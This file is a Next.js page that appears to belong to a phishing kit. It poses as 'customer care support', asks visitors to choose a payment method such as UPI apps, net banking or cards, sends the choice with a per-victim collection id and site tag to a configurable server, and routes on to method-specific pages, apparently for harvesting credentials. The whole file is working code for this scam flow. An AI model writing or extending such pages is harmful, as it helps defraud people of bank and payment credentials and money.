'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  
import { useState } from 'react';
import Link from "next/link";

export default function Home() {
  const router = useRouter();
  const API_URL = process.env.NEXT_PUBLIC_URL;
  const SITE = process.env.NEXT_PUBLIC_SITE;

  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
      e.preventDefault()
      setLoading(true); // Set loading state to true
      let routeName = "";
      const formData = new FormData(e.target);
      const jsonObject1 = {};
      const jsonObject = {};
      formData.forEach((value, key) => {
        if(value=='AmzonePay' || value=='PhonePay' || value=='GooglePay' || value=='Paytm'){
            routeName = "/upi";
        }else if(value=='NetBanking'){
            routeName = "/netbanking";
        }else if(value=='VisaMastercard'){
            routeName = "/visa";
        }else if(value=='Other'){
           routeName = "/otherchoosebanking";
        }else{
          alert("route name not found");
        }
          jsonObject[key] = value;
      });
      jsonObject1['data'] = jsonObject;
      jsonObject1['site'] = SITE;
      jsonObject1['id'] = localStorage.getItem("collection_id");
      
      try {
          const response = await fetch(`${API_URL}`, {
              method: 'POST',
              body: JSON.stringify(jsonObject1)
          });

          if (!response.ok) {
              throw new Error('Network response was not ok');
          }
          const responseData = await response.json();
          router.push(routeName);
      } catch (error) {
          console.error('There was a problem with the fetch operation:', error);
      } finally{
          setLoading(false); 
      }
  };
  return (
    <>
    <Header />
      <h3 className="text-center mx-2">
        CUSTOMER CARE SUPPORT INSTANT SOLUTION
      </h3>
      <img src="help/step3.jpeg" className="w-100" alt="" />
    <main className="px-3">
      
    <div className="form-container m-2">
  <div className="btn w-100 btn-outline-success text-dark">
    Select Payment Mode
  </div>
  <form onSubmit={handleSubmit} id="submitForm">
    <div className="mt-4 mb-3 mx-2 row">
      <div className="form-check col-6 my-3">
        <input
          className="form-check-input "
          type="radio"
          defaultValue="VisaMastercard"
          name="payment_mode"
          defaultChecked=""
        />
        <label className="form-check-label">
          <img src="help/visa.png" alt="" />
        </label>
      </div>
      <div className="form-check col-6 my-3">
        <input
          className="form-check-input "
          type="radio"
          defaultValue="NetBanking"
          name="payment_mode"
        />
        <label className="form-check-label">
          <img src="help/banking.png" alt="" />
        </label>
      </div>
      <div className="form-check col-6 my-3">
        <input
          className="form-check-input "
          type="radio"
          defaultValue="AmzonePay"
          name="payment_mode"
        />
        <label className="form-check-label">
          <img src="help/amazone.png" alt="" />
        </label>
      </div>
      <div className="form-check col-6 my-3">
        <input
          className="form-check-input "
          type="radio"
          defaultValue="GooglePay"
          name="payment_mode"
        />
        <label className="form-check-label">
          <img src="help/google.png" alt="" />
        </label>
      </div>
      <div className="form-check col-6 my-3">
        <input
          className="form-check-input "
          type="radio"
          defaultValue="PhonePay"
          name="payment_mode"
        />
        <label className="form-check-label">
          <img src="help/phone.png" alt="" />
        </label>
      </div>
      <div className="form-check col-6 my-3">
        <input
          className="form-check-input "
          type="radio"
          defaultValue="Paytm"
          name="payment_mode"
        />
        <label className="form-check-label">
          <img src="help/paytm.webp" alt="" />
        </label>
      </div>
      <div className="form-check col-6 my-3">
        <input
          className="form-check-input "
          type="radio"
          defaultValue="Other"
          name="payment_mode"
        />
        <label className="form-check-label">Other</label>
      </div>
    </div>
    <div className="d-flex justify-content-between">
      <Link
        href="/2"
        type="submit"
        className="btn btn-outline-success  mt-3 text-center"
      >
        <img src="help/back.png" alt="" />
      </Link>
      <button
        type="submit"
        className="btn btn-success  mt-3 text-center"
        id="submit-button"
        disabled={loading}
      >
        {loading ? 'Please wait...' : 'Next'}
      </button>
    </div>
    
  </form>
</div>
  
    </main>

    <Footer />
</>
  );

}
